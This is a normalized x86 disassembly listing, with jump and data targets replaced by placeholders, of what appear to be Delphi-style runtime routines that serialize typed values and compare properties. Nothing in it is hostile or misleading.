dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_421ff0
mov edx esi
mov eax edi
call sub_41c3cc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_422044
mov eax [ ebp - 0x4 ]
call sub_421ff8
inc esi
dec ebx
jne r-xdata
sub_42182c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_41b654
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_408224
test al al
jne r-xdata
sub_42187c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4219c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_4240cc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_42182c
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4240a0
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_4240cc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4240a0
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4219ca
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4240a0
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4240a0
test [ eax + 0x24 ] 0x4
je r-xdata
sub_4219d0
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421dac
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4032e0
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_4043e0
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4215d0
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_421710
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_422000
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4032e0
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_404384
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_423674
mov eax [ ebp - 0x8 ]
call sub_4032d8
call sub_4035d0
call sub_4173c8
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_404384
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4032e0
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_404384
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_4044a0
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_423674
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_422044
mov eax [ ebp - 0x4 ]
call sub_421ff8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_421d4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_423674
mov eax [ ebp - 0x4 ]
call sub_4215d0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41b654
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421d54
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_421d0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_42187c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_403390
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_421570
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_40358c
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_421d54
mov eax [ ebp - 0x4 ]
call sub_421ff8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421db3
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_404144
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4215d0
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4215e8
sub_421dd0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_42385c
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_42163c
pop ebx
pop ebp
retn 0xc
sub_421df4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_42385c
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_42163c
pop ebx
pop ebp
retn 0x4
sub_421e18
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_42385c
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_42163c
pop ebx
pop ebp
retn 0x8
sub_421e3c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_42385c
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_42163c
pop ebx
pop ebp
retn 0x8
sub_421e60
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_408224
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_408224
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_42385c
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_408224
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_42385c
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_408224
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_42385c
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_42385c
mov edx esi
mov eax ebx
call sub_423674
mov dl 0xd
mov eax ebx
call sub_42385c
jmp r-xdata
sub_421f24
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_42385c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_42163c
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_42385c
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_42163c
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_42385c
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_42163c
jmp r-xdata
pop edx
pop ebx
retn
sub_421f98
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_42385c
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_42163c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_421f24
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_422000
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_42163c
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_421f24
sub_422044
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4035d0
call sub_4173c8
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4027b4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4220f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4035d0
mov edx [ ebp - 0x10 ]
call sub_417604
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_4027d4
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_417658
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4230d8
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_42210c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4032d8
mov edx eax
mov eax [ edi ]
call sub_4035bc
test al al
jne r-xdata
mov al 0x1
sub_42213c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417688
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_417688
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_422194
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417e80
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_417e80
fld [ ebp - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4221f0
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41829c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41829c
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_422248
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_4222c7
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417cc4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4049a4
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_417cc4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4049a4
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4222ce
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404844
retn
sub_4222d8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408224
test al al
jne r-xdata
mov al 0x1
sub_422318
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_417688
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_4222d8
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_422370
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417688
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
push ebp
call sub_422318
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_422318
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_4223f0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_42249c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4224a3
lea eax [ ebp - 0x8 ]
call sub_405b50
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_418300
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405b50
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d7b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_4222d8
pop ecx
mov ebx eax
sub_4224bc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_422579
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418300
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405b50
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d7b0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422580
lea eax [ ebp - 0x10 ]
call sub_405b50
lea eax [ ebp - 0xc ]
call sub_405b50
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_418300
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_4223f0
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_422598
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418224
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_418224
mov ebx [ ebp - 0x10 ]
mov al 0x1
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov eax [ eax ]
mov edx esi
call sub_403664
cmp [ ebp - 0x110 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422610
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_422697
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4181a4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_414bc0
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4181a4
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_414d30
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42269e
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bd4
retn
sub_4226a8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_42210c
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_42276a ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_417688
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
push ebp
call sub_42213c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_422194
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_422248
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_422370
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_422598
pop ecx
